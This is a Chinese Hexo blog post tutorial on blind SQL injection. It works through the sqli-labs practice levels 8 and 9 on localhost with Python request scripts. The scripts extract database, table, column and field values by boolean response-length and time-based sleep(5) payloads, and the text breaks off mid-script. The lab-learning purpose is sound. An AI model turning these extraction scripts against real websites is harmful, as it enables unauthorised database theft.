@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="obsem">
+
+
+
+<meta name="description" content="盲注前言： 之前就想写一篇与盲注有关的博客，但由于一直不会写脚本，就拖下来了，现在把博客补上，因为手工注入比较麻烦，所以这篇主要写脚本注入。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入姿势（3）">
+<meta property="og:url" content="http://yoursite.com/2019/05/25/SQL注入姿势（3）/index.html">
+<meta property="og:site_name" content="obsetear">
+<meta property="og:description" content="盲注前言： 之前就想写一篇与盲注有关的博客，但由于一直不会写脚本，就拖下来了，现在把博客补上，因为手工注入比较麻烦，所以这篇主要写脚本注入。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190727111754953.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019072711234798.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70">
+<meta property="og:updated_time" content="2021-02-08T12:52:03.627Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入姿势（3）">
+<meta name="twitter:description" content="盲注前言： 之前就想写一篇与盲注有关的博客，但由于一直不会写脚本，就拖下来了，现在把博客补上，因为手工注入比较麻烦，所以这篇主要写脚本注入。">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190727111754953.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="obsetear" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>SQL注入姿势（3） | obsetear</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/2.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">obsem</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">obsem</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/2.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">obsem</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-SQL注入姿势（3）" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/25/SQL注入姿势（3）/" class="article-date">
+      <time datetime="2019-05-24T16:00:00.000Z" itemprop="datePublished">2019-05-25</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SQL注入姿势（3）
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p><strong>前言：</strong> 之前就想写一篇与盲注有关的博客，但由于一直不会写脚本，就拖下来了，现在把博客补上，因为手工注入比较麻烦，所以这篇主要写脚本注入。</p>
+<a id="more"></a>
+<h5 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h5><p>以sqli-labs第8关为例<br>第8关是bool盲注，首先判断注入点（无论什么注入，第一步都是判断注入点，就算写脚本第一步也要判断注入点），经过一番尝试，判断出闭合符号是单引号。<br><img src="https://img-blog.csdnimg.cn/20190727111754953.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在写脚本之前，我们先了解下脚本的思路：<br>bool盲注的特点就是页面永远只有两种状态，一种是payload执行正确时的页面，例如上面的这种情况，另一种就是payload执行错误时的页面，如下图<br><img src="https://img-blog.csdnimg.cn/2019072711234798.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwMDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这两种页面中HTML的状态码肯定是不一样的，因此HTML状态码长度也不一样，我们先记录一个payload执行正确时返回的HTML状态码的长度，然后再多次构造payload向服务器发送请求，当服务器返回的HTML的状态码的长度与我们原先记录的长度一致时，则说明这个payload语句正确。</p>
+<p>首先我们需要记录一个正确payload执行后返回的HTML状态码的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#导入requests模块</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#第八关的url</span><br><span class="line">url=&quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot;</span><br><span class="line"></span><br><span class="line">#requests.get()用于请求目标网站，返回值为服务器响应的网页源码</span><br><span class="line">#requests.get(url).text 把返回的网页源码转换成文本形式</span><br><span class="line">response_len=len(requests.get(url).text)</span><br></pre></td></tr></table></figure>
+
+<p>然后根据语句：<code>?id=1&#39; and  length(database())=i</code> 来写判断数据库的长度的函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#判断数据库的长度</span><br><span class="line">def dbname_len():</span><br><span class="line">    db_len = 0</span><br><span class="line">    max=20</span><br><span class="line">    #构造ayload</span><br><span class="line">    url_t=url+&quot;&apos; and length(database())=&#123;0&#125; --+&quot;</span><br><span class="line">    for i in range(1,max):</span><br><span class="line">        url2=url_t.format(i)</span><br><span class="line">        #str.format(i) 把str中&#123;&#125;里的值替换成i</span><br><span class="line">        response = requests.get(url2)</span><br><span class="line">        if len(response.text)==response_len:</span><br><span class="line">            db_len = i</span><br><span class="line">            print(&quot;数据库长度为：&quot;,db_len)</span><br><span class="line">            break</span><br><span class="line">    if db_len==0:</span><br><span class="line">        if i==max-1:</span><br><span class="line">            print(&quot;max的值太小&quot;)</span><br><span class="line">        print(&quot;长度函数执行失败&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    return db_len</span><br><span class="line">#调用该函数</span><br><span class="line">dbname_len()</span><br></pre></td></tr></table></figure>
+
+<p>执行完该函数，得出数据库长度为8</p>
+<p>接着爆数据库名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">chars =  &apos;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_!@#$%^&amp;*(),./\[]+-=:;&quot;&apos;&apos;&quot;&lt;&gt;?|~&apos;</span><br><span class="line"></span><br><span class="line">#爆数据库名</span><br><span class="line">#dbname_len为数据库的长度</span><br><span class="line">def dbname(dbname_len):</span><br><span class="line">    name=&apos;&apos;</span><br><span class="line">    print(&quot;数据库名字为：&quot;,end=&quot;&quot;)</span><br><span class="line">    tempname=name</span><br><span class="line">    url_t=url+&quot;&apos; and ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;--+&quot;</span><br><span class="line">    for i in range(1,dbname_len+1):</span><br><span class="line">        for char in chars:</span><br><span class="line">            char_ascii=ord(char)</span><br><span class="line">            url2=url_t.format(i,char_ascii)</span><br><span class="line">            response = requests.get(url2)</span><br><span class="line">            if len(response.text) == response_len:</span><br><span class="line">                name+=char</span><br><span class="line">                print(char,end=&quot;&quot;)</span><br><span class="line">                break</span><br><span class="line">    if tempname==name:</span><br><span class="line">        print(&quot;爆数据库函数执行失败&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    return name</span><br><span class="line">#调用函数</span><br><span class="line">dbname(数据库的长度)</span><br></pre></td></tr></table></figure>
+
+<p>然后得到数据库’security’</p>
+<p>接下来，保险一点的步骤是先判断表的数量，然后判断每个表的长度，最后再爆表名，但这样太麻烦了，要连续写三个函数，为了方便，咱直接爆表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#爆表名</span><br><span class="line">#tn_len为表的长度，整型(int)，num为limit后的第一个参数</span><br><span class="line">def t_name(tn_len,num):</span><br><span class="line">    tname=&apos;&apos;</span><br><span class="line">    print(&quot;第&quot;,num+1,&quot;个表名为：&quot;,end=&quot;&quot;)</span><br><span class="line">    url_t=url+&quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125; --+&quot; </span><br><span class="line">    for i in range(1,tn_len+1):</span><br><span class="line">    	char2=&apos;&apos;</span><br><span class="line">        for char in chars:</span><br><span class="line">            char_ascii = ord(char)</span><br><span class="line">            url2 = url_t.format(num,i,char_ascii)</span><br><span class="line">            response=requests.get(url2)</span><br><span class="line">            if len(response.text) == response_len:</span><br><span class="line">                tname+=char</span><br><span class="line">                char2=char</span><br><span class="line">                print(char,end=&quot;&quot;)</span><br><span class="line">                break</span><br><span class="line">        if cahr2==&apos;&apos;:</span><br><span class="line">        	break</span><br><span class="line">    if tname==&apos;&apos;:</span><br><span class="line">        print(&quot;该表名不存在函数执行错误&quot;)</span><br><span class="line">    print()</span><br><span class="line">    return tname</span><br><span class="line">#调用函数</span><br><span class="line">t_name(表的长度,num)</span><br></pre></td></tr></table></figure>
+
+<p>这里表的长度未知，我们尽量把数值填大一点，函数结束的标志是当表名的下一个字符为空时就结束，所以就算你填的再大只要表名的下一个字符为空就会结束该函数。<br>这里调用时可以用一个循环，可以把所有的表都爆出来</p>
+<p>然后就该爆字段了，还是用上面的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#爆字段值</span><br><span class="line">#tname为表名，num为limit后的第一个参数，clen为字段长</span><br><span class="line">def c_name(tname,num,clen):</span><br><span class="line">    c_name=&apos;&apos;</span><br><span class="line">    print(&quot;表&quot;,tname,&quot;的第&quot;,num+1,&quot;个字段名为：&quot;,end=&quot;&quot;)</span><br><span class="line">    url_t=url+&quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;&#123;0&#125;&apos; limit &#123;1&#125;,1),&#123;2&#125;,1))=&#123;3&#125;--+&quot;</span><br><span class="line">    for i in range(1,clen+1):</span><br><span class="line">    char2=&apos;&apos;</span><br><span class="line">        for char in chars:</span><br><span class="line">            char_ascii=ord(char)</span><br><span class="line">            url2=url_t.format(tname,num,i,char_ascii)</span><br><span class="line">            response=requests.get(url2)</span><br><span class="line">            if len(response.text) == response_len:</span><br><span class="line">                c_name+=char</span><br><span class="line">                char2=char</span><br><span class="line">                print(char,end=&quot;&quot;)</span><br><span class="line">                break</span><br><span class="line">        if char2==&apos;&apos;:</span><br><span class="line">            break</span><br><span class="line">    if c_name==&apos;&apos;:</span><br><span class="line">        print(&quot;该字段不存在或函数执行错误&quot;)</span><br><span class="line">    print()</span><br><span class="line">    return c_name</span><br><span class="line">#调用函数</span><br><span class="line">c_name(表名,num,字段长)</span><br></pre></td></tr></table></figure>
+
+<p>表名可以根据上一个函数爆出来，num为limit后的第一个参数，通过修改它可以逐个把字段爆出来，字段长随便写个数值，别写太小</p>
+<p>最后就是爆元素值了，也是用这种方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#爆元素值</span><br><span class="line">#c_name为字段名，tname为表名,num为limit后的第一个参数，vlen为元素值的长度</span><br><span class="line">def values(c_name,tname,num,vlen):</span><br><span class="line">    value=&apos;&apos;</span><br><span class="line">    print(&quot;字段&quot;,c_name,&quot;第&quot;,num+1,&quot;个值为：&quot;,end=&quot;&quot;)</span><br><span class="line">    url_t=url+&quot;&apos; and ascii(substr((select &#123;0&#125; from &#123;1&#125; limit &#123;2&#125;,1),&#123;3&#125;,1))=&#123;4&#125;--+&quot;</span><br><span class="line">    for i in range(1,vlen+1):</span><br><span class="line">        char2=&apos;&apos;</span><br><span class="line">        for char in chars:</span><br><span class="line">            char_ascii=ord(char)</span><br><span class="line">            url2=url_t.format(c_name,tname,num,i,char_ascii)</span><br><span class="line">            response=requests.get(url2)</span><br><span class="line">            if len(response.text) == response_len:</span><br><span class="line">                value+=char</span><br><span class="line">                char2=char</span><br><span class="line">                print(char,end=&quot;&quot;)</span><br><span class="line">                break</span><br><span class="line">        if char2==&apos;&apos;:</span><br><span class="line">            break    </span><br><span class="line">    if value==&apos;&apos;:</span><br><span class="line">        print(&quot;该元素值不存在或函数执行错误&quot;)</span><br><span class="line">    print()</span><br><span class="line">    return value</span><br></pre></td></tr></table></figure>
+
+<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>以sqli-labs第9关为例<br>时间盲注最大的特点就是：无论payload是否执行正确，显示的界面的状态只有一个，所以我们只能用sleep函数，根据页面界面状态返回的时间来判断。</p>
+<p>其实时间盲注的脚本与bool盲注脚本很相似，除了判断payload是否执行正确的判断条件不同以外，其他的代码基本和bool盲注的代码是一样的。</p>
+<p>这个脚本的思路就是如果payload执行正确，就让服务器晚回应5秒，最后比较开始请求服务器时到服务器回应我们的时差。</p>
+<p>先导入模块并且写好相关的变量：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#导入requests和time模块</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">chars = &apos;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_!@#$%^&amp;*()&apos;</span><br><span class="line"></span><br><span class="line">url=&quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&apos;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>爆数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#爆数据库名</span><br><span class="line">#dbname_len为数据库的长</span><br><span class="line">def dbname(dbname_len):</span><br><span class="line">    name=&apos;&apos;</span><br><span class="line">    tempname=name</span><br><span class="line">    print(&quot;数据库名字为：&quot;,end=&quot;&quot;)</span><br><span class="line">    url_t=url+&quot; and if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),sleep(5),null)--+&quot;</span><br><span class="line">    for i in range(1,dbname_len+1):</span><br><span class="line">        char2=&apos;&apos;</span><br><span class="line">        for char in chars:</span><br><span class="line">            char_ascii=ord(char)</span><br><span class="line">            url2=url_t.format(i,char_ascii)</span><br><span class="line">            start_time=time.time()</span><br><span class="line">            response = requests.get(url2)</span><br><span class="line">            if time.time()-start_time&gt;4:</span><br><span class="line">                name+=char</span><br><span class="line">                char2=char</span><br><span class="line">                print(char,end=&quot;&quot;)</span><br><span class="line">                break</span><br><span class="line">        if char2==&apos;&apos;:</span><br><span class="line">            break</span><br><span class="line">    if tempname==name:</span><br><span class="line">        print(&quot;爆数据库函数执行失败&quot;)</span><br><span class="line">        exit()    </span><br><span class="line">    return name</span><br></pre></td></tr></table></figure>
+
+<p>跟上面的bool盲注的原理差不多，这里就不多赘述了</p>
+<p>爆表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#爆表名</span><br><span class="line">#tn_len为表的长度，整型(int)，num为limit后面的第一个参数</span><br><span class="line">def t_name(tn_len,num):</span><br><span class="line">    tname=&apos;&apos;</span><br><span class="line">    print(&quot;第&quot;,num+1,&quot;个表名为：&quot;,end=&quot;&quot;)</span><br><span class="line">    url_t=url+&quot;and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(5),null) --+&quot; </span><br><span class="line">    for i in range(1,tn_len+1):</span><br><span class="line">        char2=&apos;&apos;</span><br><span class="line">        for char in chars:</span><br><span class="line">            char_ascii = ord(char)</span><br><span class="line">            url2 = url_t.format(num,i,char_ascii)</span><br><span class="line">            start_time=time.time()</span><br><span class="line">            response=requests.get(url2)</span><br><span class="line">            if time.time()-start_time&gt;4:</span><br><span class="line">                tname+=char</span><br><span class="line">                char2=char</span><br><span class="line">                print(char,end=&quot;&quot;)</span><br><span class="line">                break</span><br><span class="line">        if char2==&apos;&apos;:</span><br><span class="line">            break</span><br><span class="line">    if tname==&apos;&apos;:</span><br><span class="line">        print(&quot;爆表名函数执行错误&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    return tname</span><br></pre></td></tr></table></figure>
+
+<p>爆字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#爆字段值</span><br><span class="line">#tname为表名，num为limit后的第一个参数，clen为字段长</span><br><span class="line">def c_name(tname,num,clen):</span><br><span class="line">    c_name=&apos;&apos;</span><br><span class="line">    print(&quot;表&quot;,tname,&quot;的第&quot;,num+1,&quot;个字段名为：&quot;,end=&quot;&quot;)</span><br><span class="line">    url_t=url+&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name=&apos;&#123;0&#125;&apos; limit &#123;1&#125;,1),&#123;2&#125;,1))=&#123;3&#125;),sleep(5),null)--+&quot;</span><br><span class="line">    for i in range(1,clen+1):</span><br><span class="line">        char2=&apos;&apos;</span><br><span class="line">        for char in chars:</span><br><span class="line">            char_ascii=ord(char)</span><br><span class="line">            url2=url_t.format(tname,num,i,char_ascii)</span><br><span class="line">            start_time=time.time()</span><br><span class="line">            response=requests.get(url2)</span><br><span class="line">            if time.time()-start_time&gt;4:</span><br><span class="line">                c_name+=char</span><br><span class="line">                char2=char</span><br><span class="line">                print(char,end=&quot;&quot;)</span><br><span class="line">                break</span><br><span class="line">        if char2==&apos;&apos;:</span><br><span class="line">            break</span><br><span class="line">    if c_name==&apos;&apos;:</span><br><span class="line">        print(&quot;爆字段名函数执行错误&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    return c_name</span><br></pre></td></tr></table></figure>
+
+<p>爆元素值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#爆元素值</span><br><span class="line">#c_name为字段名，tname为表名,num为limit后的第一个参数，vlen为元素值的长度</span><br><span class="line">def values(c_name,tname,num,vlen):</span><br><span class="line">    value=&apos;&apos;</span><br><span class="line">    print(&quot;字段&quot;,c_name,&quot;第&quot;,num+1,&quot;个值为：&quot;,end=&quot;&quot;)</span><br><span class="line">    url_t=url+&quot; and if((ascii(substr((select &#123;0&#125; from &#123;1&#125; limit &#123;2&#125;,1),&#123;3&#125;,1))=&#123;4&#125;),sleep(5),null)--+&quot;</span><br><span class="line">    for i in range(1,vlen+1):</span><br><span class="line">        char2=&apos;&apos;</span><br><span class="line">        for char in chars:</span><br><span class="line">            char_ascii=ord(char)</span><br><span class="line">            url2=url_t.format(c_name,tname,num,i,char_ascii)</span><br><span class="line">            start_time=time.time()</span><br><span class="line">            response=requests.get(url2)</span><br><span class="line">            if time.time()-start_time&gt;4:</span><br><span class="line">                value+=char</span><br><span 